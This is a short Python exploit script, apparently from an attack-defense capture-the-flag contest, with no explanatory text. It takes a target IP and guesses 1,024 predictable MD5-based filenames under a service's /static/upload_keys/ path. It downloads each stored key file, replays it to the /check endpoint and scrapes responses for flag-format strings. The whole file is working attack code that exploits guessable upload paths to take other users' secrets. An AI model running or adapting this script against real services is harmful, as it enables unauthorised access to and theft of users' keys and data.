import requests
import hashlib
import sys
import re


def get_secure_filename(numb):
    h = hashlib.md5(numb.to_bytes(16, 'big'))
    return h.hexdigest()

if __name__ == "__main__":
    ip = sys.argv[1]
    url = f"http://{ip}:5000"
    keys = []
    for i in range(2**10):
        try:
            r = requests.get(f'{url}/static/upload_keys/{get_secure_filename(i)}')
            key = {'profile': ('sploit.key', r.text)}
            r = requests.post(f'{url}/check', files=key)
            result = re.findall(r'[A-Z0-9]{31}=', r.text)
            if result:
                print(result)
        except:
            pass